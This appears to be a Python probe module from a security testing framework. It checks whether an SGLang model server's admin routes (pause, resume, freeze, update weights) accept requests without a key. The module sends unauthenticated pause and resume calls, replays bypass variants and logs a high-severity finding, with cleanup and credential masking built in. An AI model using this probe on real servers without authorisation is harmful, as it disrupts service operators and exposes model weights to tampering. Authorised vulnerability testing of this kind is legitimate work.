"""SGLang 管理面 fail-open — 管理路由无 key 即放行（暂停/冻结/权重更新）。

Ruling: 实验室直达路由（sglang /pause、/resume，靶场 writes=False；探测后立即 /resume 无副作用清理）。
"""
from __future__ import annotations

import json
import time
import urllib.error
import urllib.request
from pathlib import Path

KEY = "sglang-admin-failopen"
WRITES = False
TIMEOUT = 3


def _mask(value) -> str:
    """凭据脱敏：MOCK 前缀 + 尾 4 位；全文仅存证据 trace（归档层）。"""
    s = str(value)
    return f"MOCK****{s[-4:]}" if len(s) > 8 else "MOCK****"


def _resolve_mode(params: dict) -> tuple[str, str]:
    """backup-write 仅当模块 writes=True 且提供 backup_targets；否则降级 probe-only。"""
    if params.get("mode") != "backup-write":
        return "probe-only", ""
    if WRITES and params.get("backup_targets"):
        return "backup-write", ""
    return "probe-only", "降级probe-only（backup-write 需 backup_targets）"


def _target(params: dict) -> str:
    return str(params.get("target") or "").rstrip("/")


class Trace:
    """HTTP 全量 trace（请求+响应+错误），写 ctx['run'].dir/traces/<key>.json 后作 artifact。"""

    def __init__(self, ctx: dict):
        d = Path(ctx["run"].dir) / "traces"
        d.mkdir(parents=True, exist_ok=True)
        self.path = d / f"{KEY}.json"
        self.entries: list[dict] = []

    def call(self, method: str, url: str, body=None, headers: dict | None = None):
        entry = {"ts": round(time.time(), 3), "method": method, "url": url,
                 "body": body, "headers": dict(headers or {})}
        data = json.dumps(body).encode("utf-8") if body is not None else None
        req = urllib.request.Request(url, data=data, method=method)
        if data is not None:
            req.add_header("Content-Type", "application/json")
        for k, v in (headers or {}).items():
            req.add_header(k, v)
        try:
            with urllib.request.urlopen(req, timeout=TIMEOUT) as resp:
                raw, status = resp.read(), resp.status
        except urllib.error.HTTPError as exc:
            raw, status = exc.read(), exc.code
        except Exception as exc:
            entry.update(status=0, error=f"{type(exc).__name__}: {exc}")
            self.entries.append(entry)
            return entry
        text = raw.decode("utf-8", "replace")
        try:
            payload = json.loads(text)
        except ValueError:
            payload = text
        entry.update(status=status, response=payload)
        self.entries.append(entry)
        return entry

    def dump(self) -> Path:
        self.path.write_text(
            json.dumps({"module": KEY, "entries": self.entries}, ensure_ascii=False, indent=1),
            encoding="utf-8")
        return self.path


def _ok(entry: dict | None) -> bool:
    return entry is not None and entry.get("status") == 200


def _resp(entry: dict | None) -> dict:
    r = (entry or {}).get("response")
    return r if isinstance(r, dict) else {}


def run(ctx: dict, params: dict) -> dict:
    target = _target(params)
    mode, note = _resolve_mode(params)
    if not target:
        return {"summary": "no-target", "artifacts": [], "findings": []}
    t = Trace(ctx)
    pause = t.call("POST", f"{target}/pause", {})
    resume = None
    if _ok(pause):
        resume = t.call("POST", f"{target}/resume", {})  # 探测即恢复：不留服务状态残留
    # payload 变体（版本矩阵驱动）：/pause 主探针成立后重放 ≤2 变体，收集绕过面差分
    variant_hits = []
    if _ok(pause):
        # `_lateral-common.py` 文件名含连字符，不能作包模块导入；按仓库惯例以 importlib 装载
        import importlib.util as _ilu
        from pathlib import Path as _Path
        _spec = _ilu.spec_from_file_location(
            "_lateral_common", _Path(__file__).resolve().parent.parent / "_lateral-common.py")
        _mod = _ilu.module_from_spec(_spec)
        _spec.loader.exec_module(_mod)
        VariantProber = _mod.VariantProber

        vp = VariantProber(t, KEY, limit=2)
        variant_hits = vp.probe(method="POST", path="/pause", body={}, base_url=target)
        if any(h["status"] == 200 for h in variant_hits):
            t.call("POST", f"{target}/resume", {})  # 变体命中后的清理（不留状态残留）
    findings = []
    if _ok(pause) and _resp(pause).get("applied") is True:
        detail = {"route": "/pause(+/resume 清理)", "unauth_status": 200, "applied": True,
                  "admin_routes": ["/pause", "/freeze", "/resume", "/update_weights_from_disk"],
                  "note": "管理路由无管理密钥即放行（fail-open）"}
        if variant_hits:
            detail["payload_variants"] = variant_hits
        findings.append({"sev": "high", "title": "SGLang 管理面 fail-open：无管理密钥放行暂停/恢复",
                         "detail": json.dumps(detail, ensure_ascii=False)})
    artifact = t.dump()
    summary = f"/pause={pause.get('status')} /resume={resume.get('status') if resume else 'skipped'} mode={mode}"
    if variant_hits:
        summary += f" variants={len(variant_hits)}"
    if note:
        summary += f"；{note}"
    return {"summary": summary, "artifacts": [str(artifact)], "findings": findings}
